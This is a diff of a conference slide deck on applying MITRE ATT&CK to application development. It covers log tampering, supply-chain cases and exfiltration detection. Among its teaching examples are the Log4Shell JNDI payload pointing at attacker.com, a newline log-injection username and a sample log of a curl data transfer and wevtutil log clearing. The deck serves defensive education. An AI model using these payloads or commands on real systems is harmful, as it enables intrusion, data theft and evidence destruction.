-<!-- This is the sneaky stuff. Once attackers are in, they don't want to be detected. They'll tamper with logs, obfuscate their tools, and masquerade as legitimate processes. If your logging can be manipulated, your incident response is blind. Every keep has a scribe writing the chronicle; the attacker just needs them to write the wrong words. -->
+<!-- Once attackers are in, they don't want to be detected. They may tamper with logs, obfuscate their tools, or masquerade as legitimate processes. The next question is whether we can trust the evidence used to detect and investigate them. -->
 
 ---
 
@@ -739,33 +675,32 @@ var connStr = (await client.GetSecretAsync("db-connection")).Value.Value;
 <!-- T1027 is about hiding malicious payloads — encoding, encryption, packing. T1070 is log tampering — deleting or modifying logs to cover tracks. T1036 is masquerading — making malicious files look like legitimate system files. These techniques make forensic investigation extremely difficult. -->
 
 ---
-<!-- _class: parchment -->
 
-## SNEAK 100: Living Off the Land
+## Living Off the Land: Correlate the Signals
 
-<div class="columns">
-<div>
+```text
+evidence.log
 
-![h:480 center](./img/memes/sneak-100.jpg)
+02:13:07  > powershell.exe spawned by svc_build
+02:13:42  > curl POST 48 MB -> 185.220.x.x
+02:18:55  > wevtutil cl Security; App; System
 
-</div>
-<div>
+[!] alert correlation: ATTACK CHAIN DETECTED
+```
 
 **ATT&CK lens:** 
   - T1059 command execution
   - T1070 log tampering
   - T1071 C2
 
-</div>
-</div>
-
-<!-- Speaker note: The attacker is not always wearing a black cloak. Sometimes they look like the build agent, the admin shell, or yesterday's maintenance job. -->
+<!-- Individually, a shell, an HTTP transfer, and a maintenance command can look legitimate. Correlate the same process identity across this short time window before deciding to investigate or contain it. This synthetic evidence sequence is an illustration, not a ready-made detection rule; expected build behavior provides the baseline. -->
 ---
+
+<!-- _class: code-focus -->
 
 ## Log Injection Attack (T1070)
 
 ```python
-# VULNERABLE - Log injection enables T1070
 import logging
 logger = logging.getLogger(__name__)
 
@@ -774,11 +709,10 @@ def login():
     username = request.json.get('username')
     password = request.json.get('password')
     if not authenticate(username, password):
-        logger.warning(f"Failed login for user: {username}")  # T1070!
+        logger.warning(f"Failed login for user: {username}")
         return "Invalid credentials", 401
     return "Login successful"
 # Attack: "admin\n[INFO] Successful login for admin"
-# Creates fake success log entry
 ```
 
 <!-- Log injection is subtle and devastating. The attacker's username contains a newline and a fake log entry. Your log file now shows a successful admin login that never happened — and the real failed attempt is buried. During incident response, investigators will see "Successful login for admin" and miss the attack entirely. -->
@@ -788,7 +722,7 @@ def login():
 ## Tamper-Evident Logging (T1070 Prevention)
 
 ```csharp
-// T1070 Prevention: Ship logs to immutable external storage
+// T1070 defense: export logs outside the application host
 builder.Logging.AddOpenTelemetry(otel => {
     otel.AddOtlpExporter();                        // OpenTelemetry export
 });
@@ -801,12 +735,11 @@ logger.LogWarning("Failed login for user: {User}",
 
 ```python
 # Python: structured logging → Azure Monitor / Log Analytics
-from opentelemetry import trace
 from azure.monitor.opentelemetry import configure_azure_monitor
-configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
+configure_azure_monitor()  # Export telemetry to Azure Monitor
 ```
 
-<!-- The real solution is: don't own the log storage. Ship structured logs via OpenTelemetry to Azure Monitor Log Analytics or Application Insights. The logs land in an immutable workspace you query with KQL — attackers can't tamper with what they can't reach. Sanitize inputs before logging to prevent injection, and use structured logging so fields aren't interpolated into raw strings. -->
+<!-- Separate log storage from the application and restrict the application's permissions on that storage. These snippets illustrate telemetry export and input sanitization; enabling an exporter does not configure immutable storage or retention. Set those controls separately, and consider immutable archival storage where required. Azure Monitor Log Analytics and Application Insights support investigation with KQL. Structured fields and newline sanitization help prevent an attacker-controlled value from impersonating a separate event. -->
 
 ---
 
@@ -814,17 +747,13 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ![center](./img/immutable-logging.drawio.png)
 
-<!-- This architecture ensures that even if an attacker gets root access, they can't silently erase their tracks. The local buffer, encrypted storage, and external SIEM create multiple independent records. Tamper detection compares them — if they disagree, someone modified the logs. -->
+<!-- The goal is independent evidence even if the application host is compromised. The local buffer, protected storage, and external SIEM provide separate records to compare. Encryption alone is not immutability: restrict deletion and retention changes, protect integrity proofs outside the host, and alert on missing as well as modified records. -->
 
 ---
 
-<!-- _class: section -->
-
 # Supply Chain Compromise
 
-![bg opacity:.2](./themes/techorama/techorama-hero-medieval.png)
-
-<!-- This is the technique that keeps security teams up at night. Why attack your code when they can attack the code you depend on? SolarWinds, Shai-Hulud, and the event-stream incident showed how devastating supply-chain compromises can be — and Log4Shell showed how a trusted library's own critical flaw can be just as catastrophic. We'll distinguish two failure modes: supply-chain compromise versus dependency-trust failure. Why scale the wall when you can poison the caravan the keep already trusts? -->
+<!-- So far we've followed abuse through application features. Now change the entry point: what if malicious code arrives through something the build already trusts? SolarWinds, Shai-Hulud, and event-stream illustrate upstream compromise; Log4Shell illustrates a critical flaw in a trusted dependency. Keep those two failure modes distinct as we walk through the existing cases. -->
 
 ---
 
@@ -838,6 +767,15 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 <!-- T1195 is the broad category — any compromise of something upstream of you. T1195.001 specifically targets software dependencies — the npm packages, PyPI packages, and NuGet packages we all depend on. The average application has hundreds of dependencies, each one a potential attack vector. -->
 
 ---
+
+<style scoped>
+table { font-size: 0.75em; line-height: 1.25; table-layout: fixed; }
+th, td { padding: 5px 8px; }
+th:nth-child(1) { width: 16%; }
+th:nth-child(2) { width: 7%; }
+th:nth-child(3) { width: 50%; }
+th:nth-child(4) { width: 27%; }
+</style>
 
 ## The Supply-Chain Attack Arc
 
@@ -855,6 +793,8 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ---
 
+<!-- _class: compact-columns -->
+
 ## Log4Shell (2021) — Dependency-Trust Failure, Not Compromise
 
 <div class="columns">
@@ -865,7 +805,7 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 - Any logged string could trigger code execution:
   `${jndi:ldap://attacker.com/x}`
 - Transitive dependency — most teams didn't know they had it
-- CVSS 10.0 · patched in **Log4j 2.15.0**
+- CVSS 10.0 · initial fix: **Log4j 2.15.0**
 
 </div>
 <div>
@@ -876,14 +816,16 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 - A critical flaw in a **trusted, legitimate library**
 - Exposed lack of Software Bill of Materials (SBOM) visibility
 
-> The lesson: your dependency graph can betray you **even when nobody is attacking it.**
+> A dependency can be vulnerable **without a compromised publisher.**
 
 </div>
 </div>
 
-<!-- Log4Shell doesn't belong in the same column as SolarWinds or event-stream. There was no malicious maintainer, no poisoned package, no hijacked build pipeline. Apache Log4j was doing exactly what it was designed to do — and that design had a critical flaw. This is the dependency-trust failure mode: you trusted the library, the library was wrong. The developer lesson: transitive dependencies can contain critical vulnerabilities you don't even know about. When Log4Shell dropped in December 2021, organizations scrambled for weeks just to answer "do we have Log4j?" With a Software Bill of Materials, that answer takes seconds, not weeks. -->
+<!-- Log4Shell differs from SolarWinds or event-stream: there was no malicious maintainer, poisoned package, or hijacked build pipeline. The library's design had a critical flaw that attackers could exploit. Version 2.15.0 was an initial response, not a current upgrade recommendation; later fixes followed, so use current vendor guidance. The developer lesson is dependency visibility: teams first needed to answer "do we have Log4j?" A current Software Bill of Materials helps locate affected components. -->
 
 ---
+
+<!-- _class: compact-columns -->
 
 ## Case Study: XZ Utils Backdoor (CVE-2024-3094)
 
@@ -904,15 +846,17 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 - **T1195.001** — Supply chain compromise
 - **T1098** — Maintainer takeover
 - **T1027** — Obfuscation (not in git!)
-- **T1059** — Remote Code Execution (RCE) via SSHd · Common Vulnerability Scoring System (CVSS) 10.0
+- **T1059** — Remote code execution via SSHd
 - 💡 Caught: SSH was **500ms slower**
 
 </div>
 </div>
 
-<!-- This is the most sophisticated supply chain attack in open source history. A state-sponsored actor spent TWO YEARS building trust, contributing legitimate patches, then socially engineering their way to co-maintainer. The backdoor was only in the release tarballs, not the git repo — bypassing all code review. It was caught by sheer luck when Andres Freund noticed SSH performance degradation while debugging something unrelated. -->
+<!-- The XZ incident illustrates patient abuse of maintainer trust and release packaging. The actor spent years contributing and gaining influence; the release tarballs contained malicious build-stage material that ordinary source review did not expose. Andres Freund investigated unexpected SSH performance degradation and found the backdoor. RCE means remote code execution; CVSS, the Common Vulnerability Scoring System, rated CVE-2024-3094 at 10.0. The developer takeaway is to verify the built release, not just the source changes. -->
 
 ---
+
+<!-- _class: compact-columns -->
 
 ## Case Study: Notepad++ Update Hijack (2025)
 
@@ -944,6 +888,8 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 
 ---
 
+<!-- _class: compact-columns -->
+
 ## Case Study: Axios NPM Compromise (2026)
 
 <div class="columns">
@@ -965,89 +911,70 @@ configure_azure_monitor()  # Logs go to immutable Log Analytics workspace
 - **T1059** — RAT via postinstall script
 - **T1552** — Credential harvesting
 - 🇰🇵 Attributed to **Sapphire Sleet** (DPRK)
-- 💥 **100M+ weekly downloads** exposed
+- **Package reach:** 100M+ weekly downloads
 
 </div>
 </div>
 
-<!-- The Axios attack in March 2026 hit the most popular HTTP client in JavaScript — over 100 million weekly downloads. Attackers compromised a maintainer's account using social engineering and RAT malware, then published two poisoned versions. The hidden dependency ran a postinstall script that downloaded a platform-specific RAT targeting secrets on Windows, macOS, and Linux. It was live for only 3 hours but potentially exposed millions of CI/CD pipelines and dev environments. The attribution to North Korea's Sapphire Sleet group shows how nation-states target the open source supply chain. -->
+<!-- The Axios case combines maintainer-account compromise with an install-time dependency. The hidden dependency's postinstall script downloaded a platform-specific RAT targeting secrets on Windows, macOS, and Linux. The three-hour window and affected versions matter when investigating exposure. The weekly-download figure describes package reach, not a confirmed victim count. RAT means remote access Trojan. The developer takeaway is to treat dependency installation as code execution under the build identity. -->
 
 ---
 
-<!-- _class: parchment -->
-
-## One Does Not Simply Patch Production
-
-<div class="columns">
-<div>
-
-![w:100%](./img/memes/one-does-not-simply.jpg)
-
-</div>
-<div>
+## Patching Is More Than Deploying
 
 > "It's just one CVE."
 
-| The council says | The keep actually needs |
+| The ticket says | The application needs |
 |---|---|
-| Patch the gate | Know which gates exist |
-| Restart the service | Prove the caravan still runs |
-| Close the ticket | Watch for sappers already inside |
+| Patch the dependency | Inventory affected services |
+| Restart the service | Verify the critical workflows |
+| Close the ticket | Check for prior compromise |
 
 **ATT&CK lens:** T1190 — Exploit Public-Facing Application
-
-</div>
-</div>
 
 <!-- Speaker note: The joke is that patching is not a button. For developers, the real work is asset inventory, safe rollout, compensating controls, and post-patch detection. -->
 ---
 
-<style scoped>
-pre { font-size: 0.48em; line-height: 1.15; margin: 0.2em 0; }
-</style>
+<!-- _class: code-focus -->
 
 ## Dependency Security Toolkit (T1195.001 Prevention)
 
 ```bash
-# Audit & verify — run in CI/CD
-npm audit --audit-level high              # NPM vulnerability scan
-pip-audit && bandit -r .                  # Python vuln scan + SAST
-dotnet list package --vulnerable --include-transitive  # .NET vuln scan
+# 1. Scan known vulnerabilities and application code
+npm audit --audit-level high
+pip-audit && bandit -r .
+dotnet list package --vulnerable --include-transitive
 ```
 
 ```bash
-# Lock files — pin exact versions + hashes
-npm ci --only=production                  # Install from lockfile exactly
-pip install --require-hashes -r req.txt   # Verify hashes on install
-dotnet restore --locked-mode              # Fail if lockfile doesn't match
+# 2. Reproduce the reviewed dependency set
+npm ci --omit=dev
+pip install --require-hashes -r req.txt
+dotnet restore --locked-mode
 ```
 
 ```bash
-# SBOMs — know what's in your software
-syft . -o spdx-json > sbom.json           # Generate SBOM with Syft
-npm sbom --sbom-format cyclonedx           # NPM native SBOM support
-grype sbom:./sbom.json                     # Scan SBOM against CVE databases
+# 3. Inventory components and scan the SBOM
+syft . -o spdx-json > sbom.json
+npm sbom --sbom-format cyclonedx
+grype sbom:./sbom.json
 ```
 
-<!-- Three layers of defense: First, audit every dependency for known vulnerabilities in CI. Second, use lockfiles with cryptographic hashes so no one can swap a package without detection. Third, generate SBOMs — a complete inventory of every component — so when a new CVE drops you can instantly answer "are we affected?" Run all three as gates in your CI/CD pipeline. -->
+<!-- Three complementary checks, not a guarantee of safe dependencies. npm audit, pip-audit, and dotnet's vulnerable-package listing check known advisories; Bandit is static analysis of Python code. Lockfiles and hashes reproduce an approved dependency set but cannot make an already malicious approved version safe. npm ci --omit=dev is for a production-dependency installation; build and test jobs may need dev dependencies. Syft and npm provide alternative SBOM formats; the shown Grype command scans Syft's sbom.json. Add publisher and artifact provenance checks and tightly limit lifecycle-script permissions to address compromise as well as known vulnerabilities. -->
 
 ---
 
-## Supply Chain Security Flow
+## From Supply-Chain Compromise to Data Theft
 
 ![center](./img/attack-chain-supply.drawio.png)
 
-<!-- This is your supply chain security pipeline. Every dependency goes through integrity checks and vulnerability scanning before it's installed. Even after installation, monitoring continues — because vulnerabilities can be discovered in packages you already use. Automation is key — make this a gate in your CI/CD pipeline. -->
+<!-- This diagram is an illustrative attacker path, not the defensive build pipeline. A compromised dependency can execute code, expose credentials, enable account abuse, and lead to exfiltration. The previous slide's dependency checks address the entry point; runtime identity and data-access controls address later steps. Ask where our earlier controls would interrupt this chain. The next section follows the data leaving the application. -->
 
 ---
 
-<!-- _class: section -->
-
 # Collection & Exfiltration
 
-![bg opacity:.2](./themes/techorama/castle-skyline-silhouette.png)
-
-<!-- This is the endgame for many attacks. The attacker has gotten in, escalated privileges, and moved laterally. Now they want the data. How do they collect it, and how do they get it out without being noticed? The treasure is in the strongroom; the trick is getting it out without anyone noticing the wagons leaving. -->
+<!-- Data theft is an objective in many attacks. Assume the attacker now has a usable identity and can reach the application. A valid request can still be abusive: which data, how many records, and how much outbound volume are normal for that user? -->
 
 ---
 
@@ -1062,6 +989,8 @@ grype sbom:./sbom.json                     # Scan SBOM against CVE databases
 <!-- T1213 is bulk data harvesting — think SELECT * FROM customers. T1567 uses legitimate cloud services like Dropbox or Google Drive to exfiltrate data, making it hard to distinguish from normal traffic. T1020 automates the process with scripts that systematically extract and transfer data. -->
 
 ---
+
+<!-- _class: compact-columns -->
 
 ## Real World: The Exfiltration Playbook
 
@@ -1082,7 +1011,7 @@ grype sbom:./sbom.json                     # Scan SBOM against CVE databases
 - **T1213** — Accessed encrypted vault backups
 - **T1567** — Exfiltrated via cloud storage API
 - 💥 25M+ users' vault data stolen
-- 💡 Attacker targeted **a developer's home PC**
+- 💡 Attacker targeted **a developer's home&nbsp;PC**
 
 </div>
 </div>
@@ -1091,67 +1020,50 @@ grype sbom:./sbom.json                     # Scan SBOM against CVE databases
 
 ---
 
+<!-- _class: code-focus -->
+
 ## Data Access Anomaly Detection
 
 ```python
-# T1213 Detection: Unusual data access patterns
-class DataAccessMonitor:
-    def __init__(self):
-        self.user_baselines = {}
-    def check_access_pattern(self, user_id, query, context):
-        baseline = self.get_user_baseline(user_id)
-        current = {
-            'records_accessed': query.estimated_rows,
-            'tables_accessed': len(query.tables),
-            'data_sensitivity': self.classify_sensitivity(query.tables)
-        }
-        score = self.calculate_anomaly_score(baseline, current)
-        if score > 0.8:
-            self.log_technique('T1213', {
-                'user': user_id, 'score': score, 'query': query.sanitized_sql
-            })
-            return self.require_step_up_auth(user_id)
-        return True
-    def calculate_anomaly_score(self, baseline, current):
-        scores = [min(abs((current[m] - baseline[m]['mean']) /
-                  baseline[m]['std']) / 3.0, 1.0)
-                  for m in ['records_accessed', 'tables_accessed']]
-        return max(scores)
+def check_access_pattern(self, user_id, query, context):
+    baseline = self.get_user_baseline(user_id)
+    current = {"records_accessed": query.estimated_rows,
+               "tables_accessed": len(query.tables)}
+    score = self.calculate_anomaly_score(baseline, current)
+    if score > 0.8:
+        self.log_technique("T1213", {"user": user_id, "score": score})
+        return self.require_step_up_auth(user_id)
+    return True
 ```
 
-<!-- This is behavioral analytics in action. We baseline each user's normal data access patterns — how many records they typically access, which tables, what time of day. When someone suddenly accesses 10x their normal volume or touches sensitive tables they've never queried before, the anomaly score spikes and we trigger step-up authentication. -->
+**Normal baseline → allow. Score above 0.8 → log + step-up authentication.**
+
+<!-- This method excerpt keeps the decision visible; baseline storage and scoring move to the explanation. The illustrative score compares record and table counts with per-user means and standard deviations, caps each normalized deviation at 1, and takes the maximum. A real scorer needs minimum baseline history and a nonzero variance floor. Sensitivity classification and login time can add context but were not part of the original two-metric score. Full events can include sanitized query metadata, never raw sensitive query values. Threshold 0.8 is illustrative, not a universal boundary. Require a successful step-up before releasing the result, and define how legitimate bulk exports are handled. -->
 
 ---
+
+<!-- _class: code-focus -->
 
 ## API Rate Limiting with Exfil Detection
 
 ```javascript
-// T1567/T1020 Prevention: Exfiltration-aware rate limiting
-class ExfiltrationDetector {
-    constructor() { this.tracking = new Map(); }
-    async checkDataTransfer(userId, requestSize, responseSize) {
-        const now = Date.now();
-        const windowMs = 60 * 60 * 1000; // 1 hour
-        if (!this.tracking.has(userId)) this.tracking.set(userId, []);
-        const transfers = this.tracking.get(userId)
-            .filter(t => now - t.timestamp < windowMs);
-        transfers.push({ timestamp: now, responseSize });
-        this.tracking.set(userId, transfers);
-        // Bulk transfer analysis
-        const total = transfers.reduce((sum, t) => sum + t.responseSize, 0);
-        if (total > 100 * 1024 * 1024) { // 100MB in 1 hour
-            await this.logSecurityEvent('T1567', {
-                userId, totalTransferred: total,
-                requestCount: transfers.length, timeWindow: '1h'
-            });
-            return false; // Block
-        }
-        return true;
-    }
+async checkDataTransfer(userId, requestSize, responseSize) {
+    const now = Date.now(), windowMs = 60 * 60 * 1000;
+    const transfers = (this.tracking.get(userId) || [])
+        .filter(t => now - t.timestamp < windowMs);
+    transfers.push({ timestamp: now, responseSize });
+    this.tracking.set(userId, transfers);
+    const total = transfers.reduce((sum, t) => sum + t.responseSize, 0);
+    if (total <= 100 * 1024 * 1024) return true;
+    await this.logSecurityEvent("T1567", {
+        userId, totalTransferred: total,
+        requestCount: transfers.length, timeWindow: "1h"
+    });
+    return false;
 }
 ```
 
-<!-- Traditional rate limiting counts requests. Exfiltration-aware rate limiting counts bytes. An attacker might make only 10 API calls, but if each returns 10MB of data, that's 100MB of exfiltration in minutes. By tracking cumulative transfer volume per user per time window, we can detect and block bulk data theft even at low request rates. -->
+<!-- This method excerpt preserves the rolling-hour calculation and event fields; the class constructor initializes this.tracking to a Map. The rule counts response bytes, not the unused requestSize argument, and includes the candidate response before deciding. Exactly 100 MiB is allowed; more than 100 MiB returns false and emits a T1567 event. The caller must enforce that decision before sending data. Ten 11 MiB responses exceed the example threshold even at a low request rate, illustrating T1020-style automation and T1567-related transfer monitoring. Production accounting needs shared, atomic storage, bounded history, and a policy for blocked attempts and legitimate bulk exports. -->
 
 ---
 
@@ -1163,11 +1075,9 @@ class ExfiltrationDetector {
 
 ---
 
-<!-- _class: section -->
-
 # Practical Implementation
 
-<!-- Now let's talk about how to actually bring all of this into your development workflow. Theory is great, but what do you do on Monday morning? This is where the castle map becomes the maintenance plan: which walls do we inspect, instrument, and reinforce first? -->
+<!-- Now apply the same questions in the development workflow: what can an attacker do to this feature, what can we observe, and what response should follow? Start with identity, sessions, and data access rather than trying to cover the entire matrix. -->
 
 ---
 
@@ -1181,7 +1091,7 @@ class ExfiltrationDetector {
 
 ## Map Features to Techniques
 
-| Application Feature | ATT&CK Techniques | Risk Level |
+| Application Feature | ATT&CK Techniques | Example Risk |
 |---------------------|------------------|------------|
 | User Login | T1078 Valid Accounts, T1110 Brute Force, T1566 Phishing | High |
 | Password Reset | T1566 Phishing, T1078 Valid Accounts | High |
@@ -1192,7 +1102,7 @@ class ExfiltrationDetector {
 | Logging System | T1070 Indicator Removal, T1027 Obfuscation | Medium |
 | Dependencies | T1195 Supply Chain, T1195.001 Compromise Dependencies | Medium |
 
-<!-- This table is a cheat sheet. For every feature in your application, you can look up which ATT&CK techniques are relevant. User login maps to credential attacks. File upload maps to web shells. Data export maps to exfiltration. Use this as a starting point for your threat model — customize it for your specific application. -->
+<!-- This is a starting-point worksheet, not a universal risk ranking. User login maps to credential attacks, file upload to web shells, and data export to exfiltration. Adjust the candidate techniques and risk labels for your exposure, privileges, data sensitivity, and existing controls. Dependencies can be critical even though this illustrative table labels them Medium. -->
 
 ---
 
@@ -1209,7 +1119,6 @@ class ExfiltrationDetector {
 <!-- These are the five patterns we've seen throughout this talk. Behavioral analytics baseline normal behavior and flag anomalies. Technique logging uses ATT&CK IDs so your SIEM can correlate across systems. Adaptive controls increase security requirements when risk increases. Honey tokens are traps for attackers. Immutable auditing ensures your investigation data can't be tampered with. -->
 
 ---
-<!-- _class: parchment -->
 
 ## Detection Maturity: A Brief Evolution
 
@@ -1217,23 +1126,21 @@ class ExfiltrationDetector {
 
 **ATT&CK lens:** T1071 — Application Layer Protocol
 
-<!-- This is the galaxy-brain format. The joke teaches the maturity curve: raw logs are useful, alerts are better, technique correlation gives shared language, and behavioral analytics catches attacker movement that simple rules miss. The captain who notices the new guard limping the wrong way — that's the top brain. Most teams live in the second or third panel; the goal of an ATT&CK-aware detection strategy is to push the median up one rung at a time. -->
+<!-- The maturity curve moves from isolated log searches to alerts, correlated techniques, and behavioral context. These are complementary capabilities, not replacements for each other. Improve one useful signal and its response before adding more detection complexity. -->
 ---
-
-<!-- _class: parchment -->
 
 ## Defense in Depth Architecture
 
-![w:900px center](./img/defense-in-depth.drawio.png)
+![h:470 center](./img/defense-in-depth.drawio.png)
 
 
-<!-- Defense in depth means every layer has its own security controls. The outer bailey blocks noisy T1190 and T1110 attempts, the inner bailey limits stolen-key damage from T1078, the keep catches injection and business-logic abuse, and the strongroom protects secrets and data even after earlier walls fail. The point is not one perfect wall; it is forcing the attacker to beat independent controls at every layer while your detection has more chances to see them. -->
+<!-- Defense in depth uses independent controls: input validation for T1190, authentication monitoring for T1110 and T1078, authorization to limit privilege, and data-access controls to reduce impact. Detection and response still matter when prevention fails. Each layer creates another opportunity to observe or interrupt the attack. -->
 
 ---
 
 ## OWASP + ATT&CK Integration
 
-![w:1000px center](./img/owasp-attack-integration.drawio.png)
+![h:470 center](./img/owasp-attack-integration.drawio.png)
 
 <!-- This is how OWASP and ATT&CK work together in practice. OWASP gives you secure coding practices, vulnerability testing, and security reviews. ATT&CK adds behavioral monitoring, technique correlation, and threat hunting. Together, you get: Secure by Design, Monitor by Behavior, and Respond by Intelligence. Your existing tools — SAST, SIEM, code reviews, pen tests — all have both an OWASP angle (find vulnerabilities) and an ATT&CK angle (detect technique patterns). Leverage what you already have. -->
 
@@ -1271,26 +1178,21 @@ class ExfiltrationDetector {
 <!-- Don't try to boil the ocean. Phase 1 is mapping and logging — understand what you're defending and make sure you can see what's happening. Phase 2 adds active detection and automated response. Phase 3 adds advanced capabilities like deception and threat intelligence. Each phase builds on the last. -->
 
 ---
-<!-- _class: parchment -->
 
-## Roll Initiative: When the Alert Is Real
-
-![bg right fit](./img/memes/roll-initiative.png)
-
+## When the Alert Is Real
 
 ```text
-
 SIEM:  T1071 beacon pattern from build agent
 App:   unusual token use from impossible travel
 API:   30x normal export volume
-Team:  ...roll initiative
+Team:  correlate, triage, contain
 ```
 
-| First round | Action |
+| Step | Action |
 |---|---|
 | Triage | Confirm signal and scope blast radius |
 | Contain | Revoke token, isolate runner, stop export |
-| Preserve | Snapshot logs before the scribe gets bribed |
+| Preserve | Protect logs and capture evidence |
 | Recover | Patch path, rotate secrets, write detection |
 
 **ATT&CK lens:** T1071 — Application Layer Protocol
@@ -1298,6 +1200,8 @@ Team:  ...roll initiative
 
 <!-- This is the response handoff: detection only matters if the team knows the first moves. The practical lesson is to predefine containment and evidence-preservation actions for high-risk ATT&CK-tagged alerts. -->
 ---
+
+<!-- _class: compact-columns -->
 
 ## Team Adoption & Tooling
 
@@ -1345,11 +1249,15 @@ Team:  ...roll initiative
 
 ---
 
-<!-- _class: parchment -->
+<style scoped>
+table { font-size: 0.78em; line-height: 1.2; }
+blockquote { font-size: 0.9em; margin: 0.5em 0; }
+p { margin: 0.35em 0; }
+</style>
 
 ### How It Started vs How It's Going
 
-![bg right fit](./img/memes/how-it-started.jpg)
+![bg right:25% fit](./img/memes/how-it-started.jpg)
 
 
 | How it started 😎 | How it's going 😱 |
@@ -1363,23 +1271,19 @@ Team:  ...roll initiative
 
 **ATT&CK lens:** T1190 — Exploit Public-Facing Application
 
-<!-- This is a joke but also very real. Every security TODO in your backlog is a technique an attacker can exploit. The difference between the left and right columns is just time. ATT&CK helps you prioritize which TODOs to fix first based on real adversary behavior. Medieval engineers also thought one tall wall was enough, right up until someone found the servant's door. -->
+<!-- Security TODOs can leave opportunities for attackers. Use ATT&CK to prioritize the ones relevant to your application's exposure and likely attack paths. This is a reminder to act on the three priorities from the previous slide, not an instruction to fix every possible technique at once. -->
 ---
-
-<!-- _class: framed -->
 
 ## Key Takeaways
 
-![bg opacity:.4](./themes/techorama/celtic-border-gold.png)
-
-- ✅ **OWASP + ATT&CK = Complete Security** - Prevention + Detection
+- ✅ **OWASP + ATT&CK = Better-Informed Defense** - Prevention + Detection
 - ✅ **Think Like an Attacker** - Understand adversary behavior patterns
 - ✅ **Build Detection Into Code** - Monitoring isn't just ops responsibility
 - ✅ **Log ATT&CK Technique IDs** - Enable security team correlation
 - ✅ **Use Behavioral Analytics** - Go beyond simple rule-based detection
 - ✅ **Start Small, Iterate** - Pick 3 techniques and expand coverage
 
-<!-- Wrapping up. Leave with a map of the gates, keys, tunnels, watchtowers, and strongrooms your code needs to defend. If you remember nothing else: OWASP and ATT&CK are complementary, not competing. Think like an attacker to build better defenses. Detection is a developer responsibility, not just ops. Tag your security events with ATT&CK IDs. Use behavioral analytics. And start with three techniques — don't try to cover everything at once. -->
+<!-- If you remember nothing else: OWASP and ATT&CK are complementary, not competing, and neither guarantees complete security. Identify likely attacker behavior, instrument the relevant signals, and define a response. Start with identity, sessions, and data access. Revisit the crooked-line visual: we do not need to predict every move to make that path harder and more observable. -->
 
 ---
 
@@ -1387,24 +1291,19 @@ Team:  ...roll initiative
 
 ![bg left](./img/owl.png)
 
+[Slides & samples](https://github.com/codebytes/mitre-attack-for-devs)
+
 <!-- Thank you! I'm happy to take questions. If we run out of time, catch me in the hallway or reach out on BlueSky or LinkedIn. -->
 
 ---
 
 # Tell Me How I Did
 
-- **What landed?** 
-- **Where go deeper?** 
-- **What to trim?** 
+- **What landed?**
+- **Where should I go deeper?**
+- **What should I trim?**
 
-
-![bg right](./themes/techorama/mitre_attck_for_developers-qr-code.png)
-
-
-
-<!-- Your feedback shapes the next chapter of this deck. Scan that scroll if you're willing to share what worked, what didn't, and where you'd like me to focus next time. -->
-
-
+<!-- Your feedback shapes the next revision of this deck. Share what worked, what didn't, and where you'd like me to focus next time, either in person or through the contact links on the next slide. -->
 ---
 
 <div class="columns">
@@ -1424,11 +1323,10 @@ Team:  ...roll initiative
 ## Chris Ayers
 
 <i class="fa-brands fa-bluesky"></i> BlueSky: [@chris-ayers.com](https://bsky.app/profile/chris-ayers.com)
-<i class="fa-brands fa-linkedin"></i> LinkedIn: - [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
+<i class="fa-brands fa-linkedin"></i> LinkedIn: [chris\-l\-ayers](https://linkedin.com/in/chris-l-ayers/)
 <i class="fa fa-window-maximize"></i> Blog: [https://chris-ayers\.com/](https://chris-ayers.com/)
 <i class="fa-brands fa-github"></i> GitHub: [Codebytes](https://github.com/codebytes)
 <i class="fa-brands fa-mastodon"></i> Mastodon: [@Chrisayers@hachyderm.io](https://hachyderm.io/@Chrisayers)
-~~<i class="fa-brands fa-twitter"></i> Twitter: @Chris_L_Ayers~~
 
 </div>
 </div>
